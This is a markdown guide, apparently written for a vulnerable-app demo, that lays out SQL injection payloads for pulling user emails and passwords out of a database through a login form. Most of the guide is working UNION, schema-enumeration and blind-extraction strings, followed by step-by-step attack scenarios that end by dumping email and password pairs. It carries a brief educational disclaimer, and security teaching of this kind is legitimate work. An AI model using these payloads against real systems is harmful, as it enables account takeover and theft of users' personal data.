# 🔍 SQL Injection Email Discovery Guide

This guide shows you how to discover user emails and other sensitive information through SQL injection attacks.

## 🎯 **Basic Email Discovery Techniques**

### 1. **Simple UNION Attack**
```sql
' UNION SELECT email,email FROM users--
```
- **What it does:** Extracts all email addresses from the users table
- **Result:** You get a list of all user emails

### 2. **Limited Email Extraction**
```sql
' UNION SELECT email,email FROM users LIMIT 1--
```
- **What it does:** Gets only the first email address
- **Result:** Single email to start with

### 3. **Pattern-Based Discovery**
```sql
' UNION SELECT email,email FROM users WHERE email LIKE '%@%'--
```
- **What it does:** Finds emails containing '@' symbol
- **Result:** All valid email addresses

### 4. **Admin Email Discovery**
```sql
' UNION SELECT email,email FROM users WHERE email LIKE 'admin%'--
```
- **What it does:** Finds admin-related emails
- **Result:** Admin email addresses

## 🔓 **Advanced Email Discovery**

### 5. **Database Schema Enumeration**
```sql
' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name='users'--
```
- **What it does:** Discovers table structure
- **Result:** Column names including email field

### 6. **Error-Based Discovery**
```sql
' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%@%')>0--
```
- **What it does:** Tests if emails exist
- **Result:** Boolean response about email existence

### 7. **Blind Email Extraction**
```sql
' AND (SELECT SUBSTRING(email,1,1) FROM users LIMIT 1)='a'--
```
- **What it does:** Extracts emails character by character
- **Result:** Email addresses extracted slowly

## 🎭 **Real-World Attack Scenarios**

### **Scenario 1: Unknown Database Structure**
1. **First:** `' UNION SELECT 1,2--` (test UNION)
2. **Then:** `' UNION SELECT table_name,column_name FROM information_schema.columns--`
3. **Finally:** `' UNION SELECT email,password FROM users--`

### **Scenario 2: Email Enumeration**
1. **Start:** `' UNION SELECT email,email FROM users LIMIT 1--`
2. **Continue:** `' UNION SELECT email,email FROM users LIMIT 1 OFFSET 1--`
3. **Complete:** `' UNION SELECT email,email FROM users--`

### **Scenario 3: Pattern Matching**
1. **Admin emails:** `' UNION SELECT email,email FROM users WHERE email LIKE 'admin%'--`
2. **Gmail users:** `' UNION SELECT email,email FROM users WHERE email LIKE '%@gmail.com'--`
3. **Company emails:** `' UNION SELECT email,email FROM users WHERE email LIKE '%@company.com'--`

## 🚀 **How to Use in Your Demo**

### **Step 1: Basic Discovery**
- Email: `' UNION SELECT email,email FROM users--`
- Password: `anything`
- **Result:** All emails exposed

### **Step 2: Targeted Discovery**
- Email: `' UNION SELECT email,email FROM users WHERE email LIKE 'admin%'--`
- Password: `anything`
- **Result:** Admin emails only

### **Step 3: Complete Enumeration**
- Email: `' UNION SELECT email,password FROM users--`
- Password: `anything`
- **Result:** All emails + passwords

## 📊 **What You'll Discover**

### **Email Patterns Found:**
- **Admin accounts:** admin@bank.com
- **Regular users:** john@bank.com, jane@bank.com
- **Email domains:** @bank.com, @gmail.com, etc.
- **Email formats:** firstname@domain.com

### **Additional Data:**
- **Usernames:** Extracted from email addresses
- **Domain information:** Company email domains
- **Account types:** Admin vs regular user patterns

## ⚠️ **Important Notes**

1. **Always test in controlled environments**
2. **These techniques work on vulnerable systems only**
3. **Use for educational and security testing purposes**
4. **Never attack real systems without permission**

## 🎯 **Success Indicators**

- **Console shows:** "🔍 EMAIL DISCOVERY ATTACK DETECTED!"
- **Page shows:** "🎯 HACK SUCCESSFUL!"
- **JSON file:** Downloaded with all user data
- **Console log:** Complete email list displayed

---

**Remember:** This guide is for educational purposes to understand how attackers discover sensitive information through SQL injection vulnerabilities.
